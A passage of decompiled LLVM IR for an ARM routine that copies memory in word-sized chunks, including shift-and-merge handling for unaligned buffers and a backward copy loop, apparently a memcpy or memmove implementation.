  %v0_fd60 = load i32, i32* %r2.global-to-local, align 4
  %v2_fd60 = add i32 %v0_fd60, -16
  store i32 %v2_fd60, i32* %r2.global-to-local, align 4
  %v6_fd64 = icmp slt i32 %v0_fd60, 16
  br i1 %v6_fd64, label %dec_label_pc_fd68, label %dec_label_pc_fd38.dec_label_pc_fd38_crit_edge

dec_label_pc_fd38.dec_label_pc_fd38_crit_edge:    ; preds = %dec_label_pc_fd38
  %v0_fd38.pre = load i32, i32* @lr, align 4
  %v0_fd3c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fd38

dec_label_pc_fd68:                                ; preds = %dec_label_pc_fd38
  %v2_fd68 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fd68, i32* @r4, align 4
  %v5_fd68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_fd68, i32* @r5, align 4
  %v2_fd6c = add i32 %v0_fd60, -4
  store i32 %v2_fd6c, i32* %r2.global-to-local, align 4
  %v4_fd6c = add i32 %v0_fd60, 2147483632
  %v5_fd6c = and i32 %v2_fd6c, %v4_fd6c
  %v6_fd6c = icmp slt i32 %v5_fd6c, 0
  store i1 %v6_fd6c, i1* %cpsr_v.global-to-local, align 1
  %v7_fd6c = icmp slt i32 %v2_fd6c, 0
  store i1 %v7_fd6c, i1* %cpsr_n.global-to-local, align 1
  %v5_fd70 = icmp slt i32 %v2_fd60, -12
  br i1 %v5_fd70, label %dec_label_pc_fd8c, label %dec_label_pc_fd74

dec_label_pc_fd74:                                ; preds = %dec_label_pc_fd68, %dec_label_pc_fd28, %dec_label_pc_fd74
  %v1_fd80 = phi i32 [ %v4_fd80, %dec_label_pc_fd74 ], [ %v12_fd5c, %dec_label_pc_fd68 ], [ %v0_fd5c74, %dec_label_pc_fd28 ]
  %v0_fd74 = load i32, i32* @lr, align 4
  %v3_fd74 = udiv i32 %v0_fd74, 256
  store i32 %v3_fd74, i32* %ip.global-to-local, align 4
  %v0_fd78 = load i32, i32* %r1.global-to-local, align 4
  %v1_fd78 = inttoptr i32 %v0_fd78 to i32*
  %v2_fd78 = load i32, i32* %v1_fd78, align 4
  store i32 %v2_fd78, i32* @lr, align 4
  %v4_fd78 = add i32 %v0_fd78, 4
  store i32 %v4_fd78, i32* %r1.global-to-local, align 4
  %v4_fd7c = mul i32 %v2_fd78, 16777216
  %v5_fd7c = or i32 %v4_fd7c, %v3_fd74
  store i32 %v5_fd7c, i32* @ip, align 4
  %v2_fd80 = inttoptr i32 %v1_fd80 to i32*
  store i32 %v5_fd7c, i32* %v2_fd80, align 4
  %v3_fd80 = load i32, i32* %r0.global-to-local, align 4
  %v4_fd80 = add i32 %v3_fd80, 4
  store i32 %v4_fd80, i32* %r0.global-to-local, align 4
  %v0_fd84 = load i32, i32* %r2.global-to-local, align 4
  %v2_fd84 = add i32 %v0_fd84, -4
  store i32 %v2_fd84, i32* %r2.global-to-local, align 4
  %v6_fd88 = icmp slt i32 %v0_fd84, 4
  br i1 %v6_fd88, label %dec_label_pc_fd8c.loopexit, label %dec_label_pc_fd74

dec_label_pc_fd8c.loopexit:                       ; preds = %dec_label_pc_fd74
  %v4_fd84 = sub i32 3, %v0_fd84
  %v5_fd84 = and i32 %v4_fd84, %v0_fd84
  %v6_fd84 = icmp slt i32 %v5_fd84, 0
  %v7_fd84 = icmp slt i32 %v2_fd84, 0
  store i1 %v6_fd84, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_fd84, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fd8c

dec_label_pc_fd8c:                                ; preds = %dec_label_pc_fd8c.loopexit, %dec_label_pc_fd68
  %v2_fccc112 = phi i32 [ %v4_fd80, %dec_label_pc_fd8c.loopexit ], [ %v12_fd5c, %dec_label_pc_fd68 ]
  %v0_fcbc108 = phi i32 [ %v2_fd84, %dec_label_pc_fd8c.loopexit ], [ %v2_fd6c, %dec_label_pc_fd68 ]
  %v0_fd8c = load i32, i32* %r1.global-to-local, align 4
  %v1_fd8c = add i32 %v0_fd8c, -3
  store i32 %v1_fd8c, i32* @r1, align 4
  br label %bb132

dec_label_pc_fd94:                                ; preds = %dec_label_pc_fd14
  br i1 %v5_fe04, label %dec_label_pc_fde0, label %dec_label_pc_fd9c

dec_label_pc_fd9c:                                ; preds = %dec_label_pc_fd94
  store i32 %v2_fe00, i32* %r2.global-to-local, align 4
  %v3_fda0 = load i32, i32* @r4, align 4
  store i32 %v3_fda0, i32* %stack_var_-16, align 4
  %v6_fda0 = load i32, i32* @r5, align 4
  store i32 %v6_fda0, i32* %stack_var_-12, align 4
  br label %dec_label_pc_fda4

dec_label_pc_fda4:                                ; preds = %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge, %dec_label_pc_fd9c
  %v0_fdc8 = phi i32 [ %v12_fdc8, %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge ], [ %v0_fd5c74, %dec_label_pc_fd9c ]
  %v0_fda8 = phi i32 [ %v0_fda8.pre, %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge ], [ %v4_fd18, %dec_label_pc_fd9c ]
  %v0_fda4 = phi i32 [ %v0_fda4.pre, %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge ], [ %v2_fd18, %dec_label_pc_fd9c ]
  %v3_fda4 = udiv i32 %v0_fda4, 65536
  %v1_fda8 = inttoptr i32 %v0_fda8 to i32*
  %v2_fda8 = load i32, i32* %v1_fda8, align 4
  store i32 %v2_fda8, i32* %r4.global-to-local, align 4
  %v3_fda8 = add i32 %v0_fda8, 4
  %v4_fda8 = inttoptr i32 %v3_fda8 to i32*
  %v5_fda8 = load i32, i32* %v4_fda8, align 4
  store i32 %v5_fda8, i32* %r5.global-to-local, align 4
  %v6_fda8 = add i32 %v0_fda8, 8
  %v7_fda8 = inttoptr i32 %v6_fda8 to i32*
  %v8_fda8 = load i32, i32* %v7_fda8, align 4
  store i32 %v8_fda8, i32* %ip.global-to-local, align 4
  %v9_fda8 = add i32 %v0_fda8, 12
  %v10_fda8 = inttoptr i32 %v9_fda8 to i32*
  %v11_fda8 = load i32, i32* %v10_fda8, align 4
  store i32 %v11_fda8, i32* @lr, align 4
  %v12_fda8 = add i32 %v0_fda8, 16
  store i32 %v12_fda8, i32* %r1.global-to-local, align 4
  %v4_fdac = mul i32 %v2_fda8, 65536
  %v5_fdac = or i32 %v4_fdac, %v3_fda4
  store i32 %v5_fdac, i32* @r3, align 4
  %v3_fdb0 = udiv i32 %v2_fda8, 65536
  %v4_fdb4 = mul i32 %v5_fda8, 65536
  %v5_fdb4 = or i32 %v4_fdb4, %v3_fdb0
  store i32 %v5_fdb4, i32* %r4.global-to-local, align 4
  %v3_fdb8 = udiv i32 %v5_fda8, 65536
  %v4_fdbc = mul i32 %v8_fda8, 65536
  %v5_fdbc = or i32 %v4_fdbc, %v3_fdb8
  store i32 %v5_fdbc, i32* %r5.global-to-local, align 4
  %v3_fdc0 = udiv i32 %v8_fda8, 65536
  %v4_fdc4 = mul i32 %v11_fda8, 65536
  %v5_fdc4 = or i32 %v4_fdc4, %v3_fdc0
  store i32 %v5_fdc4, i32* @ip, align 4
  %v1_fdc8 = inttoptr i32 %v0_fdc8 to i32*
  store i32 %v5_fdac, i32* %v1_fdc8, align 4
  %v3_fdc8 = add i32 %v0_fdc8, 4
  %v4_fdc8 = inttoptr i32 %v3_fdc8 to i32*
  %v5_fdc8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fdc8, i32* %v4_fdc8, align 4
  %v6_fdc8 = add i32 %v0_fdc8, 8
  %v7_fdc8 = inttoptr i32 %v6_fdc8 to i32*
  %v8_fdc8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_fdc8, i32* %v7_fdc8, align 4
  %v9_fdc8 = add i32 %v0_fdc8, 12
  %v10_fdc8 = inttoptr i32 %v9_fdc8 to i32*
  %v11_fdc8 = load i32, i32* @ip, align 4
  store i32 %v11_fdc8, i32* %v10_fdc8, align 4
  %v12_fdc8 = add i32 %v0_fdc8, 16
  store i32 %v12_fdc8, i32* %r0.global-to-local, align 4
  %v0_fdcc = load i32, i32* %r2.global-to-local, align 4
  %v2_fdcc = add i32 %v0_fdcc, -16
  store i32 %v2_fdcc, i32* %r2.global-to-local, align 4
  %v6_fdd0 = icmp slt i32 %v0_fdcc, 16
  br i1 %v6_fdd0, label %dec_label_pc_fdd4, label %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge

dec_label_pc_fda4.dec_label_pc_fda4_crit_edge:    ; preds = %dec_label_pc_fda4
  %v0_fda4.pre = load i32, i32* @lr, align 4
  %v0_fda8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fda4

dec_label_pc_fdd4:                                ; preds = %dec_label_pc_fda4
  %v2_fdd4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fdd4, i32* @r4, align 4
  %v5_fdd4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_fdd4, i32* @r5, align 4
  %v2_fdd8 = add i32 %v0_fdcc, -4
  store i32 %v2_fdd8, i32* %r2.global-to-local, align 4
  %v4_fdd8 = add i32 %v0_fdcc, 2147483632
  %v5_fdd8 = and i32 %v2_fdd8, %v4_fdd8
  %v6_fdd8 = icmp slt i32 %v5_fdd8, 0
  store i1 %v6_fdd8, i1* %cpsr_v.global-to-local, align 1
  %v7_fdd8 = icmp slt i32 %v2_fdd8, 0
  store i1 %v7_fdd8, i1* %cpsr_n.global-to-local, align 1
  %v5_fddc = icmp slt i32 %v2_fdcc, -12
  br i1 %v5_fddc, label %dec_label_pc_fdf8, label %dec_label_pc_fde0

dec_label_pc_fde0:                                ; preds = %dec_label_pc_fdd4, %dec_label_pc_fd94, %dec_label_pc_fde0
  %v1_fdec = phi i32 [ %v4_fdec, %dec_label_pc_fde0 ], [ %v12_fdc8, %dec_label_pc_fdd4 ], [ %v0_fd5c74, %dec_label_pc_fd94 ]
  %v0_fde0 = load i32, i32* @lr, align 4
  %v3_fde0 = udiv i32 %v0_fde0, 65536
  store i32 %v3_fde0, i32* %ip.global-to-local, align 4
  %v0_fde4 = load i32, i32* %r1.global-to-local, align 4
  %v1_fde4 = inttoptr i32 %v0_fde4 to i32*
  %v2_fde4 = load i32, i32* %v1_fde4, align 4
  store i32 %v2_fde4, i32* @lr, align 4
  %v4_fde4 = add i32 %v0_fde4, 4
  store i32 %v4_fde4, i32* %r1.global-to-local, align 4
  %v4_fde8 = mul i32 %v2_fde4, 65536
  %v5_fde8 = or i32 %v4_fde8, %v3_fde0
  store i32 %v5_fde8, i32* @ip, align 4
  %v2_fdec = inttoptr i32 %v1_fdec to i32*
  store i32 %v5_fde8, i32* %v2_fdec, align 4
  %v3_fdec = load i32, i32* %r0.global-to-local, align 4
  %v4_fdec = add i32 %v3_fdec, 4
  store i32 %v4_fdec, i32* %r0.global-to-local, align 4
  %v0_fdf0 = load i32, i32* %r2.global-to-local, align 4
  %v2_fdf0 = add i32 %v0_fdf0, -4
  store i32 %v2_fdf0, i32* %r2.global-to-local, align 4
  %v6_fdf4 = icmp slt i32 %v0_fdf0, 4
  br i1 %v6_fdf4, label %dec_label_pc_fdf8.loopexit, label %dec_label_pc_fde0

dec_label_pc_fdf8.loopexit:                       ; preds = %dec_label_pc_fde0
  %v4_fdf0 = sub i32 3, %v0_fdf0
  %v5_fdf0 = and i32 %v4_fdf0, %v0_fdf0
  %v6_fdf0 = icmp slt i32 %v5_fdf0, 0
  %v7_fdf0 = icmp slt i32 %v2_fdf0, 0
  store i1 %v6_fdf0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_fdf0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fdf8

dec_label_pc_fdf8:                                ; preds = %dec_label_pc_fdf8.loopexit, %dec_label_pc_fdd4
  %v2_fccc113 = phi i32 [ %v4_fdec, %dec_label_pc_fdf8.loopexit ], [ %v12_fdc8, %dec_label_pc_fdd4 ]
  %v0_fcbc109 = phi i32 [ %v2_fdf0, %dec_label_pc_fdf8.loopexit ], [ %v2_fdd8, %dec_label_pc_fdd4 ]
  %v0_fdf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_fdf8 = add i32 %v0_fdf8, -2
  store i32 %v1_fdf8, i32* @r1, align 4
  br label %bb132

dec_label_pc_fe00:                                ; preds = %dec_label_pc_fd14
  br i1 %v5_fe04, label %dec_label_pc_fe4c, label %dec_label_pc_fe08

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fe00
  store i32 %v2_fe00, i32* %r2.global-to-local, align 4
  %v3_fe0c = load i32, i32* @r4, align 4
  store i32 %v3_fe0c, i32* %stack_var_-16, align 4
  %v6_fe0c = load i32, i32* @r5, align 4
  store i32 %v6_fe0c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_fe10

dec_label_pc_fe10:                                ; preds = %dec_label_pc_fe10.dec_label_pc_fe10_crit_edge, %dec_label_pc_fe08
  %v0_fe34 = phi i32 [ %v12_fe34, %dec_label_pc_fe10.dec_label_pc_fe10_crit_edge ], [ %v0_fd5c74, %dec_label_pc_fe08 ]
  %v0_fe14 = phi i32 [ %v0_fe14.pre, %dec_label_pc_fe10.dec_label_pc_fe10_crit_edge ], [ %v4_fd18, %dec_label_pc_fe08 ]
  %v0_fe10 = phi i32 [ %v0_fe10.pre, %dec_label_pc_fe10.dec_label_pc_fe10_crit_edge ], [ %v2_fd18, %dec_label_pc_fe08 ]
  %v3_fe10 = udiv i32 %v0_fe10, 16777216
  %v1_fe14 = inttoptr i32 %v0_fe14 to i32*
  %v2_fe14 = load i32, i32* %v1_fe14, align 4
  store i32 %v2_fe14, i32* %r4.global-to-local, align 4
  %v3_fe14 = add i32 %v0_fe14, 4
  %v4_fe14 = inttoptr i32 %v3_fe14 to i32*
  %v5_fe14 = load i32, i32* %v4_fe14, align 4
  store i32 %v5_fe14, i32* %r5.global-to-local, align 4
  %v6_fe14 = add i32 %v0_fe14, 8
  %v7_fe14 = inttoptr i32 %v6_fe14 to i32*
  %v8_fe14 = load i32, i32* %v7_fe14, align 4
  store i32 %v8_fe14, i32* %ip.global-to-local, align 4
  %v9_fe14 = add i32 %v0_fe14, 12
  %v10_fe14 = inttoptr i32 %v9_fe14 to i32*
  %v11_fe14 = load i32, i32* %v10_fe14, align 4
  store i32 %v11_fe14, i32* @lr, align 4
  %v12_fe14 = add i32 %v0_fe14, 16
  store i32 %v12_fe14, i32* %r1.global-to-local, align 4
  %v4_fe18 = mul i32 %v2_fe14, 256
  %v5_fe18 = or i32 %v4_fe18, %v3_fe10
  store i32 %v5_fe18, i32* @r3, align 4
  %v3_fe1c = udiv i32 %v2_fe14, 16777216
  %v4_fe20 = mul i32 %v5_fe14, 256
  %v5_fe20 = or i32 %v4_fe20, %v3_fe1c
  store i32 %v5_fe20, i32* %r4.global-to-local, align 4
  %v3_fe24 = udiv i32 %v5_fe14, 16777216
  %v4_fe28 = mul i32 %v8_fe14, 256
  %v5_fe28 = or i32 %v4_fe28, %v3_fe24
  store i32 %v5_fe28, i32* %r5.global-to-local, align 4
  %v3_fe2c = udiv i32 %v8_fe14, 16777216
  %v4_fe30 = mul i32 %v11_fe14, 256
  %v5_fe30 = or i32 %v4_fe30, %v3_fe2c
  store i32 %v5_fe30, i32* @ip, align 4
  %v1_fe34 = inttoptr i32 %v0_fe34 to i32*
  store i32 %v5_fe18, i32* %v1_fe34, align 4
  %v3_fe34 = add i32 %v0_fe34, 4
  %v4_fe34 = inttoptr i32 %v3_fe34 to i32*
  %v5_fe34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fe34, i32* %v4_fe34, align 4
  %v6_fe34 = add i32 %v0_fe34, 8
  %v7_fe34 = inttoptr i32 %v6_fe34 to i32*
  %v8_fe34 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_fe34, i32* %v7_fe34, align 4
  %v9_fe34 = add i32 %v0_fe34, 12
  %v10_fe34 = inttoptr i32 %v9_fe34 to i32*
  %v11_fe34 = load i32, i32* @ip, align 4
  store i32 %v11_fe34, i32* %v10_fe34, align 4
  %v12_fe34 = add i32 %v0_fe34, 16
  store i32 %v12_fe34, i32* %r0.global-to-local, align 4
  %v0_fe38 = load i32, i32* %r2.global-to-local, align 4
  %v2_fe38 = add i32 %v0_fe38, -16
  store i32 %v2_fe38, i32* %r2.global-to-local, align 4
  %v6_fe3c = icmp slt i32 %v0_fe38, 16
  br i1 %v6_fe3c, label %dec_label_pc_fe40, label %dec_label_pc_fe10.dec_label_pc_fe10_crit_edge

dec_label_pc_fe10.dec_label_pc_fe10_crit_edge:    ; preds = %dec_label_pc_fe10
  %v0_fe10.pre = load i32, i32* @lr, align 4
  %v0_fe14.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fe10

dec_label_pc_fe40:                                ; preds = %dec_label_pc_fe10
  %v2_fe40 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fe40, i32* @r4, align 4
  %v5_fe40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_fe40, i32* @r5, align 4
  %v2_fe44 = add i32 %v0_fe38, -4
  store i32 %v2_fe44, i32* %r2.global-to-local, align 4
  %v4_fe44 = add i32 %v0_fe38, 2147483632
  %v5_fe44 = and i32 %v2_fe44, %v4_fe44
  %v6_fe44 = icmp slt i32 %v5_fe44, 0
  store i1 %v6_fe44, i1* %cpsr_v.global-to-local, align 1
  %v7_fe44 = icmp slt i32 %v2_fe44, 0
  store i1 %v7_fe44, i1* %cpsr_n.global-to-local, align 1
  %v5_fe48 = icmp slt i32 %v2_fe38, -12
  br i1 %v5_fe48, label %dec_label_pc_fe64, label %dec_label_pc_fe4c

dec_label_pc_fe4c:                                ; preds = %dec_label_pc_fe00, %dec_label_pc_fe40, %dec_label_pc_fe4c
  %v1_fe58 = phi i32 [ %v4_fe58, %dec_label_pc_fe4c ], [ %v0_fd5c74, %dec_label_pc_fe00 ], [ %v12_fe34, %dec_label_pc_fe40 ]
  %v0_fe4c = load i32, i32* @lr, align 4
  %v3_fe4c = udiv i32 %v0_fe4c, 16777216
  store i32 %v3_fe4c, i32* %ip.global-to-local, align 4
  %v0_fe50 = load i32, i32* %r1.global-to-local, align 4
  %v1_fe50 = inttoptr i32 %v0_fe50 to i32*
  %v2_fe50 = load i32, i32* %v1_fe50, align 4
  store i32 %v2_fe50, i32* @lr, align 4
  %v4_fe50 = add i32 %v0_fe50, 4
  store i32 %v4_fe50, i32* %r1.global-to-local, align 4
  %v4_fe54 = mul i32 %v2_fe50, 256
  %v5_fe54 = or i32 %v4_fe54, %v3_fe4c
  store i32 %v5_fe54, i32* @ip, align 4
  %v2_fe58 = inttoptr i32 %v1_fe58 to i32*
  store i32 %v5_fe54, i32* %v2_fe58, align 4
  %v3_fe58 = load i32, i32* %r0.global-to-local, align 4
  %v4_fe58 = add i32 %v3_fe58, 4
  store i32 %v4_fe58, i32* %r0.global-to-local, align 4
  %v0_fe5c = load i32, i32* %r2.global-to-local, align 4
  %v2_fe5c = add i32 %v0_fe5c, -4
  store i32 %v2_fe5c, i32* %r2.global-to-local, align 4
  %v6_fe60 = icmp slt i32 %v0_fe5c, 4
  br i1 %v6_fe60, label %dec_label_pc_fe64.loopexit, label %dec_label_pc_fe4c

dec_label_pc_fe64.loopexit:                       ; preds = %dec_label_pc_fe4c
  %v4_fe5c = sub i32 3, %v0_fe5c
  %v5_fe5c = and i32 %v4_fe5c, %v0_fe5c
  %v6_fe5c = icmp slt i32 %v5_fe5c, 0
  %v7_fe5c = icmp slt i32 %v2_fe5c, 0
  store i1 %v6_fe5c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_fe5c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fe64

dec_label_pc_fe64:                                ; preds = %dec_label_pc_fe64.loopexit, %dec_label_pc_fe40
  %v2_fccc111 = phi i32 [ %v4_fe58, %dec_label_pc_fe64.loopexit ], [ %v12_fe34, %dec_label_pc_fe40 ]
  %v0_fcbc107 = phi i32 [ %v2_fe5c, %dec_label_pc_fe64.loopexit ], [ %v2_fe44, %dec_label_pc_fe40 ]
  %v0_fe64 = load i32, i32* %r1.global-to-local, align 4
  %v1_fe64 = add i32 %v0_fe64, -1
  store i32 %v1_fe64, i32* @r1, align 4
  br label %bb132

dec_label_pc_fe6c:                                ; preds = %entry
  %v1_fe6c = load i32, i32* @r2, align 4
  %v2_fe6c = add i32 %v1_fe6c, %v0_fc20
  store i32 %v2_fe6c, i32* @r1, align 4
  %v2_fe70 = add i32 %v1_fe6c, %v1_fc20
  store i32 %v2_fe70, i32* %r0.global-to-local, align 4
  %v2_fe74 = add i32 %v1_fe6c, -4
  store i32 %v2_fe74, i32* %r2.global-to-local, align 4
  %v4_fe74 = sub i32 3, %v1_fe6c
  %v5_fe74 = and i32 %v4_fe74, %v1_fe6c
  %v6_fe74 = icmp slt i32 %v5_fe74, 0
  store i1 %v6_fe74, i1* %cpsr_v.global-to-local, align 1
  %v7_fe74 = icmp slt i32 %v2_fe74, 0
  store i1 %v7_fe74, i1* %cpsr_n.global-to-local, align 1
  %v5_fe78 = icmp slt i32 %v1_fe6c, 4
  br i1 %v5_fe78, label %bb142, label %dec_label_pc_fe7c

dec_label_pc_fe7c:                                ; preds = %dec_label_pc_fe6c
  %v1_fe7c = urem i32 %v2_fe70, 4
  store i32 %v1_fe7c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fe7c = icmp eq i32 %v1_fe7c, 0
  br i1 %v2_fe7c, label %dec_label_pc_fe84, label %dec_label_pc_ff24

dec_label_pc_fe84:                                ; preds = %dec_label_pc_fe7c
  %v1_fe84 = urem i32 %v2_fe6c, 4
  store i32 %v1_fe84, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fe84 = icmp eq i32 %v1_fe84, 0
  br i1 %v2_fe84, label %dec_label_pc_fe8c, label %dec_label_pc_ff50

dec_label_pc_fe8c:                                ; preds = %dec_label_pc_fe84, %dec_label_pc_ff48
  %v0_fea448 = phi i32 [ %v2_fe70, %dec_label_pc_fe84 ], [ %v0_ff9831, %dec_label_pc_ff48 ]
  %v0_fea047 = phi i32 [ %v2_fe6c, %dec_label_pc_fe84 ], [ %v0_ff48, %dec_label_pc_ff48 ]
  %v0_fe8c = phi i32 [ %v2_fe74, %dec_label_pc_fe84 ], [ %v2_ff40, %dec_label_pc_ff48 ]
  %v2_fe8c = add i32 %v0_fe8c, -8
  store i32 %v2_fe8c, i32* %r2.global-to-local, align 4
  %v4_fe8c = sub i32 7, %v0_fe8c
  %v5_fe8c = and i32 %v4_fe8c, %v0_fe8c
  %v6_fe8c = icmp slt i32 %v5_fe8c, 0
  store i1 %v6_fe8c, i1* %cpsr_v.global-to-local, align 1
  %v7_fe8c = icmp slt i32 %v2_fe8c, 0
  store i1 %v7_fe8c, i1* %cpsr_n.global-to-local, align 1
  %v5_fe90 = icmp slt i32 %v0_fe8c, 8
  br i1 %v5_fe90, label %dec_label_pc_fedc, label %dec_label_pc_fe94

dec_label_pc_fe94:                                ; preds = %dec_label_pc_fe8c
  %v3_fe94 = load i32, i32* @r4, align 4
  %v5_fe94 = inttoptr i32 %v3_fe94 to i8*
  store i8* %v5_fe94, i8** %stack_var_-8, align 4
  %v8_fe94 = load i32, i32* @lr, align 4
  %v2_fe98 = add i32 %v0_fe8c, -28
  store i32 %v2_fe98, i32* %r2.global-to-local, align 4
  %v4_fe98 = sub i32 27, %v0_fe8c
  %v5_fe98 = and i32 %v4_fe98, %v2_fe8c
  %v6_fe98 = icmp slt i32 %v5_fe98, 0
  store i1 %v6_fe98, i1* %cpsr_v.global-to-local, align 1
  %v7_fe98 = icmp slt i32 %v2_fe98, 0
  store i1 %v7_fe98, i1* %cpsr_n.global-to-local, align 1
  %v5_fe9c = icmp slt i32 %v2_fe8c, 20
  br i1 %v5_fe9c, label %dec_label_pc_feb8, label %dec_label_pc_fea0

dec_label_pc_fea0:                                ; preds = %dec_label_pc_fe94, %dec_label_pc_fea0.dec_label_pc_fea0_crit_edge
  %v0_fea4 = phi i32 [ %v1_feac, %dec_label_pc_fea0.dec_label_pc_fea0_crit_edge ], [ %v0_fea448, %dec_label_pc_fe94 ]
  %v0_fea0 = phi i32 [ %v0_fea0.pre, %dec_label_pc_fea0.dec_label_pc_fea0_crit_edge ], [ %v0_fea047, %dec_label_pc_fe94 ]
  %v1_fea0 = add i32 %v0_fea0, -4
  %v2_fea0 = inttoptr i32 %v1_fea0 to i32*
  %v3_fea0 = load i32, i32* %v2_fea0, align 4
  %v4_fea0 = add i32 %v0_fea0, -8
  %v5_fea0 = inttoptr i32 %v4_fea0 to i32*
  %v6_fea0 = load i32, i32* %v5_fea0, align 4
  store i32 %v6_fea0, i32* %r4.global-to-local, align 4
  %v7_fea0 = add i32 %v0_fea0, -12
  %v8_fea0 = inttoptr i32 %v7_fea0 to i32*
  %v9_fea0 = load i32, i32* %v8_fea0, align 4
  store i32 %v9_fea0, i32* %ip.global-to-local, align 4
  %v10_fea0 = add i32 %v0_fea0, -16
  %v11_fea0 = inttoptr i32 %v10_fea0 to i32*
  %v12_fea0 = load i32, i32* %v11_fea0, align 4
  store i32 %v12_fea0, i32* %lr.global-to-local, align 4
  store i32 %v10_fea0, i32* %r1.global-to-local, align 4
  %v1_fea4 = add i32 %v0_fea4, -16
  %v2_fea4 = inttoptr i32 %v1_fea4 to i32*
  store i32 %v3_fea0, i32* %v2_fea4, align 4
  %v4_fea4 = add i32 %v0_fea4, -12
  %v5_fea4 = inttoptr i32 %v4_fea4 to i32*
  %v6_fea4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_fea4, i32* %v5_fea4, align 4
  %v7_fea4 = add i32 %v0_fea4, -8
  %v8_fea4 = inttoptr i32 %v7_fea4 to i32*
  %v9_fea4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_fea4, i32* %v8_fea4, align 4
  %v10_fea4 = add i32 %v0_fea4, -4
  %v11_fea4 = inttoptr i32 %v10_fea4 to i32*
  %v12_fea4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_fea4, i32* %v11_fea4, align 4
  store i32 %v1_fea4, i32* %r0.global-to-local, align 4
  %v0_fea8 = load i32, i32* %r1.global-to-local, align 4
  %v1_fea8 = add i32 %v0_fea8, -4
  %v2_fea8 = inttoptr i32 %v1_fea8 to i32*
  %v3_fea8 = load i32, i32* %v2_fea8, align 4
  store i32 %v3_fea8, i32* @r3, align 4
  %v4_fea8 = add i32 %v0_fea8, -8
  %v5_fea8 = inttoptr i32 %v4_fea8 to i32*
  %v6_fea8 = load i32, i32* %v5_fea8, align 4
  store i32 %v6_fea8, i32* %r4.global-to-local, align 4
  %v7_fea8 = add i32 %v0_fea8, -12
  %v8_fea8 = inttoptr i32 %v7_fea8 to i32*
  %v9_fea8 = load i32, i32* %v8_fea8, align 4
  store i32 %v9_fea8, i32* @ip, align 4
  %v10_fea8 = add i32 %v0_fea8, -16
  %v11_fea8 = inttoptr i32 %v10_fea8 to i32*
  %v12_fea8 = load i32, i32* %v11_fea8, align 4
  store i32 %v12_fea8, i32* %lr.global-to-local, align 4
  store i32 %v10_fea8, i32* @r1, align 4
  %v1_feac = add i32 %v0_fea4, -32
  %v2_feac = inttoptr i32 %v1_feac to i32*
  store i32 %v3_fea8, i32* %v2_feac, align 4
  %v4_feac = add i32 %v0_fea4, -28
  %v5_feac = inttoptr i32 %v4_feac to i32*
  %v6_feac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_feac, i32* %v5_feac, align 4
  %v7_feac = add i32 %v0_fea4, -24
  %v8_feac = inttoptr i32 %v7_feac to i32*
  %v9_feac = load i32, i32* @ip, align 4
  store i32 %v9_feac, i32* %v8_feac, align 4
  %v10_feac = add i32 %v0_fea4, -20
  %v11_feac = inttoptr i32 %v10_feac to i32*
  %v12_feac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_feac, i32* %v11_feac, align 4
  store i32 %v1_feac, i32* %r0.global-to-local, align 4
  %v0_feb0 = load i32, i32* %r2.global-to-local, align 4
  %v2_feb0 = add i32 %v0_feb0, -32
  store i32 %v2_feb0, i32* %r2.global-to-local, align 4
  %v6_feb4 = icmp slt i32 %v0_feb0, 32
  br i1 %v6_feb4, label %dec_label_pc_feb8.loopexit, label %dec_label_pc_fea0.dec_label_pc_fea0_crit_edge

dec_label_pc_fea0.dec_label_pc_fea0_crit_edge:    ; preds = %dec_label_pc_fea0
  %v0_fea0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_fea0

dec_label_pc_feb8.loopexit:                       ; preds = %dec_label_pc_fea0
  %v4_feb0 = sub i32 31, %v0_feb0
  %v5_feb0 = and i32 %v4_feb0, %v0_feb0
  %v6_feb0 = icmp slt i32 %v5_feb0, 0
  %v7_feb0 = icmp slt i32 %v2_feb0, 0
  store i1 %v6_feb0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_feb0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_feb8

dec_label_pc_feb8:                                ; preds = %dec_label_pc_feb8.loopexit, %dec_label_pc_fe94
  %v6_fec0 = phi i32 [ %v1_feac, %dec_label_pc_feb8.loopexit ], [ %v0_fea448, %dec_label_pc_fe94 ]
  %v0_fec8.pr = phi i32 [ %v2_feb0, %dec_label_pc_feb8.loopexit ], [ %v2_fe98, %dec_label_pc_fe94 ]
  %v4_feb8 = add i32 %v0_fec8.pr, 16
  %v6_feb8 = sub i32 0, %v0_fec8.pr
  %v7_feb8 = and i32 %v4_feb8, %v6_feb8
  %v8_feb8 = icmp slt i32 %v7_feb8, 0
